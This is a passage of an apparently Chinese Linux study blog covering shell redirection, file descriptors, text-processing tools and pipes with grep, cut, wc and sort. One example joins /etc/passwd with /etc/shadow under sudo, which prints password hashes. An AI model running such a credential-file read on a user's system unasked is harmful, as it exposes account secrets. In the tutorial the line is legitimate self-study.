class="number">1</span></span><br></pre></td></tr></table></figure><p>或者只用bash提供的特殊的重定向符号&quot;&amp;&quot;将标准错误和标准输出同时重定向到文件：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> Documents/test.c hello.c &amp;&gt;somefilehell</span><br></pre></td></tr></table></figure><p>查看文件内容，可以看到错误信息也被写入到文件中了：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231117195418320.png" alt="image-20231117195418320"></p></li></ul><h3 id="使用tee命令同时重定向到多个文件">使用tee命令同时重定向到多个文件</h3><ul><li><p>如果既需要将输出重定向到文件，也需要将信息大隐刀终端，那么可以使用<code>tee</code>来实现：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hello shiyanlou&#x27;</span> | <span class="built_in">tee</span> hello</span><br></pre></td></tr></table></figure><p>可以看到内容既输出在了终端，同时也被写入到了文件当中：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231117195716791.png" alt="image-20231117195716791"></p></li></ul><h3 id="永久重定向">永久重定向</h3><ul><li><p>上面的操作完成的重定向只是临时的，如果希望做到永久重定向，可以使用<code>exec</code>命令完成，其作用是使用指定的命令替换当前的Shell，即使用一个进程替换当前进程，或者指定新的重定向。</p></li><li><p>先开启一个子Shell，然后使用exec替换当前进程的重定向，将标准输出重定向到一个文件：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">zsh</span></span><br><span class="line"><span class="attribute">exec</span> <span class="number">1</span>&gt;somefile</span><br></pre></td></tr></table></figure><p>那么后面执行的命令的输出都将被重定向到文件中，,直到退出当前子shell，或取消exec的重定向。</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">cat somefile</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231117201225039.png" alt="image-20231117201225039"></p></li></ul><h3 id="创建输出文件描述符">创建输出文件描述符</h3><ul><li><p>在Shel 中有9个文件描述符，上面仅仅是使用了默认提供的0、1、2号文件描述符。另外我们还可以使用3-8的文件描述符，只是它们默认没有打开而已。你可以使用下面命令查看当前 Shell 进程中打开的文件描述符：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /dev/fd/;<span class="built_in">ls</span> -Al</span><br></pre></td></tr></table></figure></li><li><p>使用<code>exec</code>命令可以创建新的文件描述并使用：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zsh</span><br><span class="line">exec <span class="number">3</span>&gt;somefile</span><br><span class="line">cd <span class="regexp">/dev/</span>fd/;ls -Al;cd -</span><br><span class="line">echo <span class="string">&quot;this is test&quot;</span> &gt;&amp;<span class="number">3</span></span><br><span class="line">cat somefile</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>  <div class="tip "><p>注意上面的第四句命令中，<code>&gt;</code>与<code>&amp;</code>之间不应该有空格，如果有空格则会出错</p></div><p><img src="https://oss.iuoyt.com/img/posts/image-20231117202354262.png" alt="image-20231117202354262"></p></li></ul><h3 id="关闭文件描述符">关闭文件描述符</h3><ul><li><p>刚才设置了3号文件描述符，可以使用如下命令将其关闭：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 3&gt;&amp;-</span><br><span class="line"><span class="built_in">cd</span> /dev/fd;<span class="built_in">ls</span> -Al;<span class="built_in">cd</span> -</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231117202538761.png" alt="image-20231117202538761"></p></li></ul><h3 id="完全屏蔽命令的输出">完全屏蔽命令的输出</h3><ul><li><p>在Linux中有一个被称为“黑洞”的设备文件，所有导入它的数据都会“消失“</p><blockquote><p>在类UNIX系统中，<code>/dev/null</code>，或称空设备，是一个特殊的设备文件，它通常被用于丢弃不需要的输出流，或作为用于输入流的空文件，这些操作通常由重定向完成。读取它则会立即得到一个EOF。</p></blockquote></li><li><p>我们可以利用<code>/dev/null</code>屏蔽命令的输出：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cat</span> Documents/test.c <span class="number">1</span>&gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>上面这样的操作将使你得不到任何输出结果。</p></li></ul><h3 id="使用-xargs-分割参数列表">使用 xargs 分割参数列表</h3><ul><li><p><code>xargs</code>是一条UNIX和类UNIX操作系统的常用命令，它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。</p></li><li><p>这个命令在有些时候十分有用，特别是当用来处理产生大量输出结果的命令如 find，locate 和 grep 的结果。比如这个命令用于将<code>/etc/passwd</code>文件按<code>:</code>分割取第一个字段排序后，使用<code>echo</code>命令生成一个列表：</p>  <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cut</span> -d: -f1 &lt; <span class="regexp">/etc/</span>passwd | <span class="built_in">sort</span> | xargs echo</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231117203054249.png" alt="image-20231117203054249"></p></li></ul><h3 id="实战训练">实战训练</h3><blockquote><p>理解下面这段代码的作用，实际这段代码不会正常工作，请结合这一小节的知识分析这段代码没有正确工作的原因，并设法解决这个问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> filename; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">rm</span> -iv <span class="variable">$filename</span></span><br><span class="line"><span class="keyword">done</span> &lt;&lt;(<span class="built_in">ls</span>)</span><br></pre></td></tr></table></figure></blockquote><ul><li><p>这段代码的作用是将<code>ls</code>命令读取到的全部文件依次删除。</p></li><li><p>但是在删除文件时会提示是否确认删除文件，而输入被<code>ls</code>得到的结果重定向了，因此无法完成确认操作，上述代码无法完成执行。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231117214749645.png" alt="image-20231117214749645"></p></li><li><p>因此需要在删除文件时由控制台输入是否确认删除文件，而在读取删除列表时再从重定向中获得输入，修改后代码如下：</p><ul><li><p>将文件描述符3指向标准输入：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">exec</span> <span class="number">3</span>&lt;&amp;<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>删除文件，由文件描述符3提供确认操作给<code>rm</code>命令，使其能够正确执行：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -iv <span class="variable">$filename</span> &lt;&amp;3</span><br></pre></td></tr></table></figure></li><li><p>遍历列表，依次删除文件：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> filename; <span class="keyword">do</span></span><br><span class="line">  &lt;delete operation&gt;</span><br><span class="line"><span class="keyword">done</span> &lt;&lt;(<span class="built_in">ls</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>因此，完整代码如下：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 3&lt;&amp;0</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> filename; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">rm</span> -iv <span class="variable">$filename</span> &lt;&amp;3</span><br><span class="line"><span class="keyword">done</span> &lt;&lt;(<span class="built_in">ls</span>)</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231117215259645.png" alt="image-20231117215259645"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中简单的文本处理</title>
      <link href="/posts/d51277ac.html"/>
      <url>/posts/d51277ac.html</url>
      
        <content type="html"><![CDATA[<h3 id="tr命令">tr命令</h3><ul><li><p><code>tr</code>命令可以用来删除一段文本中的某些文字，或者将其替换。</p></li><li><p>使用方法：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tr</span> <span class="selector-attr">[option]</span>..<span class="selector-class">.SET1</span> <span class="selector-attr">[SET2]</span></span><br></pre></td></tr></table></figure></li><li><p>其中常用选项有：</p></li></ul><table><thead><tr><th style="text-align:center">选项</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>-d</code></td><td>删除和set1匹配的字符，注意不是全词匹配也不是按字符顺序匹配</td></tr><tr><td style="text-align:center"><code>-s</code></td><td>去除set1指定的在输入文本中连续并重复的字符</td></tr></tbody></table><ul><li><p>比如，删除“hello shiyanlou”字段中的所有o、l、h：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hello shiyanlou&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;olh&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231116141547102.png" alt="image-20231116141547102"></p></li><li><p>再比如，将&quot;hello&quot; 中的“ll”,去重为一个“l”：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hello&#x27;</span> | <span class="built_in">tr</span> -s <span class="string">&#x27;l&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231116141658700.png" alt="image-20231116141658700"></p></li><li><p>将输入文本，全部转换为大写或小写输出：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;input some text here&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;[:lower:]&#x27;</span> <span class="string">&#x27;[:upper:]&#x27;</span></span><br></pre></td></tr></table></figure><p>或者：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;input some text here&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;[a-z]&#x27;</span> <span class="string">&#x27;[A-Z]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231116141758138.png" alt="image-20231116141758138"></p></li></ul><h3 id="col命令">col命令</h3><ul><li>col命令可以将tab字符换成对等数量的空格键，或者反转这个操作，使用方式为<code>col [option]</code>，常见选项有：</li></ul><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>-x</code></td><td style="text-align:center">将<code>Tab</code>转换为空格</td></tr><tr><td style="text-align:center"><code>-h</code></td><td style="text-align:center">将空格转换为<code>Tab</code>（默认选项）</td></tr></tbody></table><ul><li><p>比如，查看<code>/etc/protocols</code>中的不可见字符，可以看到很多 <code>^I</code> ，这其实就是 Tab 转义成可见字符的符号：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -A <span class="regexp">/etc/</span>protocols</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231116142042116.png" alt="image-20231116142042116"></p></li><li><p>使用<code>col -x</code>将<code>/etc/protocols</code>中的 Tab 转换为空格,然后再使用<code>cat</code>查看，发现<code>^I</code>不见了：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/protocols | col -x | <span class="built_in">cat</span> -A</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231116142151386.png" alt="image-20231116142151386"></p></li></ul><h3 id="join命令">join命令</h3><ul><li><p><code>join</code>命令用于将两个文件中包含相同内容的那一行合并在一起，使用方法：</p>  <figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">join</span> [<span class="keyword">option</span>]... file1 file2</span><br></pre></td></tr></table></figure></li><li><p>常用选项有：</p></li></ul><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>-t</code></td><td style="text-align:center">指定分隔符，默认为空格</td></tr><tr><td style="text-align:center"><code>-i</code></td><td style="text-align:center">忽略大小写的差异</td></tr><tr><td style="text-align:center"><code>-1</code></td><td style="text-align:center">指明第一个文件要用哪个字段来对比，默认对比第一个字段</td></tr><tr><td style="text-align:center"><code>-2</code></td><td style="text-align:center">指明第二个文件要用哪个字段来对比，默认对比第一个字段</td></tr></tbody></table><ul><li><p>首先在用户家目录下创建两个文件，然后进行合并：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;1 hello&#x27;</span> &gt; file1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;1 shiyanlou&#x27;</span> &gt; file2</span><br><span class="line"><span class="built_in">join</span> file1 file2</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231116142537075.png" alt="image-20231116142537075"></p></li><li><p>将<code>/etc/passwd</code>与<code>/etc/shadow</code>两个文件合并，指定以’:'作为分隔符：</p>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="keyword">join</span> -t<span class="string">&#x27;:&#x27;</span> <span class="regexp">/etc/</span>passwd <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231116142620545.png" alt="image-20231116142620545"></p></li></ul><h3 id="paste命令">paste命令</h3><ul><li><code>paste</code>与<code>join</code>类似，是在不对比数据的情况下，简单地将多个文件合并起来，并以Tab隔开，格式为<code>paste [option] file...</code>，常用选项有：</li></ul><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>-d</code></td><td style="text-align:center">指定合并的分隔符，默认为Tab</td></tr><tr><td style="text-align:center"><code>-s</code></td><td style="text-align:center">不合并到一行，每个文件为一行</td></tr></tbody></table><ul><li><p>先创建三个文件，分别存入不同内容：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> hello &gt; file1</span><br><span class="line"><span class="keyword">echo</span> shiyanlou &gt; file2</span><br><span class="line"><span class="keyword">echo</span> www.shiyanlou.<span class="keyword">com</span> &gt; file3</span><br></pre></td></tr></table></figure><p>使用<code>:</code>作为分隔符进行合并：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">paste</span> -d <span class="string">&#x27;:&#x27;</span> file1 file2 file3</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231116143257454.png" alt="image-20231116143257454"></p><p>将三个文件内容进行简单合并，每个文件占一行：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">paste</span> -s file1 file2 file3</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231116143308307.png" alt="image-20231116143308307"></p></li></ul><h3 id="实战训练">实战训练</h3><blockquote><p>在<a href="/posts/c67b19b2">文件打包与解压缩</a>中提到 Windows/dos 与 Linux/UNIX 文本文件一些特殊字符<code>不一致</code></p><p>如断行符 Windows 为 CR+LF(<code>\r\n</code>)，Linux/UNIX 为 LF(<code>\n</code>)。使用<code>cat -A 文本</code> 可以看到文本中包含的不可见特殊字符。Linux 的<code>\n</code>表现出来就是一个<code>$</code>，而 Windows/dos的表现为<code>^M$</code>，可以直接使用<code>dos2unix</code>和<code>unix2dos</code>工具在两种格式之间进行转换，使用<code>file</code>命令可以查看文件的具体类型。</p><p>不过现在希望<strong>在不使用上述两个转换工具的情况下，使用前面学过的命令手动完成 dos 文本格式到 UNIX 文本格式的转换。</strong></p></blockquote><ul><li><p>Windows的回车符仅比Linux/Unix下多出一个<code>\r</code>那么将Windows文本中的<code>\r</code>全部删除即可实现：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tr</span> -d <span class="string">&#x27;\r&#x27;</span> &lt; dos_file<span class="selector-class">.txt</span> &gt; unix_file.txt</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><p><code>&lt; dos_file.txt</code>: 从名为<code>dos_file.txt</code>的文件读取输入。</p></li><li><p><code>&gt; unix_file.txt</code>: 将输出写入名为<code>unix_file.txt</code>的文件。</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令执行顺序控制与管道</title>
      <link href="/posts/7ab3ca3a.html"/>
      <url>/posts/7ab3ca3a.html</url>
      
        <content type="html"><![CDATA[<h2 id="命令执行顺序的控制">命令执行顺序的控制</h2><ul><li><p>通常情况下，使用命令行都是输入完一条指令然后立即执行，然后再输入下一条指令。如果需要一次输入多条指令，再一并执行的话，可以使用<code>;</code>将多条指令隔开来，在一行里写下，那么在按下<kbd>Enter</kbd>的时候，会一次性执行完输入的全部命令。</p></li><li><p>但如果在顺序执行命令时，前面的命令执行不成功，而后面的命令又依赖于上一条命令的结果，那么就可能会造成花了时间，最终却得到一个错误结果的情况，并且有时还不能直观的看出是否正确执行。那么这时就需要有选择性地执行命令，比如上一条命令执行成功后才继续执行下一条，否则应该如何处理。比如使用一个<code>witch</code>来做判断，如果安装了<code>cowsay</code>命令就执行，否则什么也不做：</p>  <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which cowsay&gt;<span class="regexp">/dev/</span><span class="literal">null</span> &amp;&amp; cowsay -f head-in ohch~</span><br></pre></td></tr></table></figure><p>其中<code>&amp;&amp;</code>符号前的内容是执行条件，作为<code>&amp;&amp;</code>后语句是否执行的前提判断，如果<code>cowsay&gt;/dev/null</code>执行成功，那么会返回结果<code>0</code>，<code>&amp;&amp;</code>后的语句就会执行。</p></li><li><p>同样的，shell中也有类似于逻辑或的<code>||</code>，在此处与<code>&amp;&amp;</code>做出相反的结果，即当<code>||</code>前的语句执行结果≠0时，才执行后方的语句，比如如果未安装<code>cowsay</code>命令，那么显示出未安装提示：</p>  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which cowsay&gt;/dev/<span class="literal">null</span> <span class="string">|| echo &quot;</span>cowsay has not been install, please run &#x27;sudo apt-get install cowsay&#x27; to install<span class="string">&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><code>&amp;&amp;</code>和<code>||</code>可以结合起来使用，比如：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> cowsay&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;exist&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;not exist&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110180631916.png" alt="image-20231110180631916"></p><p>意思为检查是否安装了<code>cowsay</code>，如果安装了则显示<code>exist</code>，否则显示<code>not exist</code>。上面的语句是先使用<code>&amp;&amp;</code>再使用<code>||</code>，那么如果反过来会出现什么结果呢：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> cowsay&gt;/dev/null || <span class="built_in">echo</span> <span class="string">&quot;not exist&quot;</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;exist&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110180645027.png" alt="image-20231110180645027"></p><p>这一次同时输出了<code>not exist</code>和<code>exist</code>的结果，因为<code>&amp;&amp;</code>后的语句执行条件是前一句执行成功，而在执行<code>||</code>判断时返回结果≠0，所以执行了<code>||</code>后的语句，从而也执行了<code>&amp;&amp;</code>后的语句。</p></li></ul><h2 id="管道">管道</h2><ul><li>管道是一种通信机制，通常用于进程间的通信（也可通过socket进行网络通信），它表现出来的形式就是将前面每一个进程的输出(stdout)直接作为下一个进程的输入(stdin)。</li><li>管道又分为匿名管道和具名管道。在使用一些过滤程序时经常会用到的就是匿名管道，在命令行中由<code>|</code>分隔符表示，<code>|</code>在前面的内容中我们已经多次使用到了。具名管道简单的说就是有名字的管道，通常只会在源程序中用到具名管道。</li></ul><h3 id="管道的使用">管道的使用</h3><ul><li><p>现在尝试查看<code>/etc</code>下有那些文件和目录：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /etc</span><br></pre></td></tr></table></figure><p>输出的内容比较多，此时不妨使用管道将<code>ls</code>输出的结果使用<code>less</code>查看：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /etc | less</span><br></pre></td></tr></table></figure></li></ul><h3 id="cut命令">cut命令</h3><ul><li><p><code>cut</code>命令用于打印每一行的某一字段，比如现在需要打印<code>/etc/passwd</code>文件中以<code>:</code>位分隔符的第一个字段和第六个字段分别作为用户名和其家目录：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut <span class="regexp">/etc/</span>passwd -d <span class="string">&#x27;:&#x27;</span> -f <span class="number">1</span>,<span class="number">6</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110191238613.png" alt="image-20231110191238613"></p></li><li><p>打印<code>/etc/passwd</code>文件中每一行的前N个字符：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前五个（包含第五个）</span></span><br><span class="line">cut <span class="regexp">/etc/</span>passwd -c -<span class="number">5</span></span><br><span class="line"><span class="comment"># 前五个之后的（包含第五个）</span></span><br><span class="line">cut <span class="regexp">/etc/</span>passwd -c <span class="number">5</span>-</span><br><span class="line"><span class="comment"># 第五个</span></span><br><span class="line">cut <span class="regexp">/etc/</span>passwd -c <span class="number">5</span></span><br><span class="line"><span class="comment"># 2到5之间的（包含第五个）</span></span><br><span class="line">cut <span class="regexp">/etc/</span>passwd -c <span class="number">2</span>-<span class="number">5</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="grep命令">grep命令</h3><ul><li><p>grep命令用于在文本中或stdin中查找匹配字符串，如果结合正则表达式可以实现复杂切高效的查找和匹配，一般格式为：</p>  <figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [命令选项]... 用于匹配的表达式 [文件]...</span><br></pre></td></tr></table></figure></li><li><p>比如，搜索<code>/home/shiyanlou</code>目录下所有包含<code>shiyanlou</code>的文本文件，并显示出所在文本中的行号，其中<code>-r</code>表示地柜搜索子目录中的文件，<code>-n</code>表示打印匹配项的行号，<code>-I</code>表示忽略二进制文件：</p>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -rnI <span class="string">&quot;shiyanlou&quot;</span> ~</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110191733110.png" alt="image-20231110191733110"></p></li><li><p>同时也可以使用正则表达式，比如查找以<code>yanlou</code>结尾的字符串：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> | grep <span class="string">&quot;.*yanlou$&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110192022608.png" alt="image-20231110192022608"></p></li></ul><h3 id="wc命令">wc命令</h3><ul><li><p><code>wc</code>命令是简单小巧的计数工具，用于统计并输出一个文件中行、单词和字节的数目，比如输出<code>/etc/passwd</code>文件的统计信息：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110192208836.png" alt="image-20231110192208836"></p></li><li><p>分别只输出行数、单词数、字节数、字符数和输入文本中最长一行的字节数：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 行数</span></span><br><span class="line">wc -l <span class="regexp">/etc/</span>passwd</span><br><span class="line"><span class="comment"># 单词数</span></span><br><span class="line">wc -w <span class="regexp">/etc/</span>passwd</span><br><span class="line"><span class="comment"># 字节数</span></span><br><span class="line">wc -c <span class="regexp">/etc/</span>passwd</span><br><span class="line"><span class="comment"># 字符数</span></span><br><span class="line">wc -m <span class="regexp">/etc/</span>passwd</span><br><span class="line"><span class="comment"># 最长行字节数</span></span><br><span class="line">wc -L <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110192540334.png" alt="image-20231110192540334"></p>  <div class="tip info"><p>对于西文字符，一个字符就是一个字节，对于中文字符，一个汉字通常不小于2字节，视编码而定。</p></div></li><li><p>再结合管道，统计<code>/etc</code>下所有目录数：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -dl /etc/*/ | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110193359731.png" alt="image-20231110193359731"></p></li></ul><h3 id="sort命令">sort命令</h3><ul><li><p><code>sort</code>命令用于排序，即将输入按照一定方式进行排序，然后再输出，支持的排序方式包括但不限于：字典排序,数字排序，按月份排序，随机排序，反转排序，指定特定字段进行排序……</p></li><li><p>默认为字典排序：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110193609728.png" alt="image-20231110193609728"></p></li><li><p>反转排序：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span> -r</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110193716806.png" alt="image-20231110193716806"></p></li><li><p>按照特定字段排序：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span> -t<span class="string">&#x27;:&#x27;</span> -k 3</span><br></pre></td></tr></table></figure><p><code>-t</code>参数用于指定字段的分隔符，这里是以&quot;:&quot;作为分隔符；<code>-k 字段号</code>用于指定对哪一个字段进行排序。这里<code>/etc/passwd</code>文件的第三个字段为数字，默认情况下是以字典序排序的，如果要按照数字排序就要加上<code>-n</code>参数，此处按照分割后的第三个字段（第二个<code>:</code>后的字段）排序：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 